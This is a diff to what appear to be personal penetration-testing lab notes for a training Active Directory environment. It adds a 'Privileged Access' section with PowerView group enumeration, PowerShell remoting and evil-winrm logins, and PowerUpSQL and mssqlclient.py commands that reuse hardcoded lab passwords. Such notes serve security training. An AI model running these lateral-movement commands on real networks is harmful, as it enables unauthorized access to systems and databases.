@@ -39,4 +39,25 @@ Get-ADComputer -Filter 'ServicePrincipalName -like "*mssql*"' | Select name,serv
 
 ```
 
-# 
+## Privileged Access
+```
+# Remote Desktop
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+
+$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+
+# WINRM
+gem install evil-winrm
+evil-winrm -i 10.129.201.234 -u forend
+
+# SQL Server
+cd .\PowerUpSQL\
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+```
